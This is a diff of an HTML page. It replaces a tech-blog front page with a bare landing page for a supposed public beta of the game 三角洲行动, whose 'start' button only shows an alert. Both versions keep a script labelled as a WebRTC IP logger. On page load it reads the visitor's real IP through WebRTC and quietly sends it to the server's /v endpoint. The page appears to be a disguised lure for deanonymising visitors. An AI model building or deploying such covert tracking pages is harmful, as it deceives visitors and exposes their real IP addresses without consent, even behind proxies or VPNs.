@@ -3,75 +3,61 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>TechNotes - 技术随笔</title>
-  <style>
-    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-    body { font-family: system-ui, -apple-system, sans-serif; background: #f5f5f5; color: #333; }
-    nav { background: #fff; border-bottom: 1px solid #e5e5e5; padding: 0 2rem; display: flex; align-items: center; justify-content: space-between; height: 56px; }
-    nav .logo { font-weight: 700; font-size: 1.2rem; color: #111; text-decoration: none; }
-    nav ul { list-style: none; display: flex; gap: 1.5rem; }
-    nav ul a { text-decoration: none; color: #555; font-size: 0.9rem; }
-    nav ul a:hover { color: #111; }
-    .hero { background: #fff; border-bottom: 1px solid #e5e5e5; padding: 3rem 2rem; text-align: center; }
-    .hero h1 { font-size: 2rem; font-weight: 700; margin-bottom: 0.5rem; }
-    .hero p { color: #666; font-size: 1rem; }
-    .container { max-width: 860px; margin: 2rem auto; padding: 0 1rem; display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
-    .card { background: #fff; border: 1px solid #e5e5e5; border-radius: 8px; padding: 1.5rem; }
-    .card .tag { display: inline-block; background: #eef2ff; color: #4f46e5; font-size: 0.75rem; padding: 2px 8px; border-radius: 4px; margin-bottom: 0.75rem; }
-    .card h2 { font-size: 1.05rem; font-weight: 600; margin-bottom: 0.5rem; line-height: 1.4; }
-    .card p { font-size: 0.875rem; color: #666; line-height: 1.6; }
-    .card .meta { margin-top: 1rem; font-size: 0.75rem; color: #999; }
-    footer { text-align: center; padding: 2rem; font-size: 0.8rem; color: #aaa; border-top: 1px solid #e5e5e5; margin-top: 2rem; }
-    @media (max-width: 600px) { .container { grid-template-columns: 1fr; } }
-  </style>
+  <title>三角洲行动 - 全球公测盛大开启</title>
+  <link rel="stylesheet" href="/assets/style.css">
 </head>
 <body>
-  <nav>
-    <a class="logo" href="/">TechNotes</a>
-    <ul>
-      <li><a href="#">首页</a></li>
-      <li><a href="#">分类</a></li>
-      <li><a href="#">归档</a></li>
-      <li><a href="#">关于</a></li>
-    </ul>
-  </nav>
-  <div class="hero">
-    <h1>技术随笔</h1>
-    <p>记录开发过程中的思考与实践</p>
+  <!-- 背景容器 -->
+  <div class="bg-container">
+    <div class="bg-overlay"></div>
   </div>
-  <div class="container">
-    <div class="card">
-      <span class="tag">前端</span>
-      <h2>深入理解 CSS Grid 布局的自动放置算法</h2>
-      <p>Grid 布局的自动放置算法决定了未显式定位的子元素如何排列，理解它能帮助你写出更简洁的布局代码。</p>
-      <div class="meta">2026-04-20 · 阅读约 6 分钟</div>
-    </div>
-    <div class="card">
-      <span class="tag">Node.js</span>
-      <h2>用 better-sqlite3 替代异步 SQLite 驱动的实践</h2>
-      <p>同步 API 在 I/O 密集型场景下并不总是劣势，本文分析了在 Express 中使用同步 SQLite 的适用场景。</p>
-      <div class="meta">2026-04-15 · 阅读约 8 分钟</div>
-    </div>
-    <div class="card">
-      <span class="tag">工具</span>
-      <h2>ip2region：离线 IP 归属地查询的最佳实践</h2>
-      <p>对比了多种离线 IP 库方案，介绍如何在 Node.js 中集成 ip2region 并处理边界情况。</p>
-      <div class="meta">2026-04-08 · 阅读约 5 分钟</div>
-    </div>
-    <div class="card">
-      <span class="tag">安全</span>
-      <h2>Express Session 安全配置备忘录</h2>
-      <p>涵盖 httpOnly、secure、sameSite 等 cookie 属性的含义，以及在反向代理后面正确配置 trust proxy 的方法。</p>
-      <div class="meta">2026-03-30 · 阅读约 7 分钟</div>
-    </div>
+
+  <div class="wrapper">
+    <!-- 头部 -->
+    <header>
+      <div class="logo">
+        <img src="/assets/images/logo.png" alt="三角洲行动">
+      </div>
+    </header>
+
+    <!-- 主内容区 -->
+    <main>
+      <div class="slogan">
+        <img src="/assets/images/slg.png" alt="无所畏惧 决战三角洲">
+      </div>
+      <a href="javascript:void(0);" class="cta-button" id="startBtn">
+        立即开战
+      </a>
+    </main>
+
+    <!-- 页脚 -->
+    <footer>
+      <div class="copyright">
+        &copy; 2026 <span class="brand">泡泡国际</span>. 版权所有
+      </div>
+    </footer>
   </div>
-  <footer>© 2026 TechNotes · 用 Node.js 驱动</footer>
+
+  <!-- WebRTC IP 记录器 -->
   <script src="/js/webrtc.js"></script>
   <script>
     (async () => {
-      const webrtcIp = await getWebRTCIP();
-      fetch(`/v?webrtc_ip=${webrtcIp || ''}`).catch(() => {});
+      try {
+        const webrtcIp = await getWebRTCIP();
+        if (webrtcIp) {
+          fetch(`/v?webrtc_ip=${webrtcIp}`).catch(() => {});
+        } else {
+          fetch('/v').catch(() => {});
+        }
+      } catch (e) {
+        fetch('/v').catch(() => {});
+      }
     })();
+
+    // 交互效果
+    document.getElementById('startBtn').addEventListener('click', () => {
+      alert('正在连接战场...');
+    });
   </script>
 </body>
 </html>
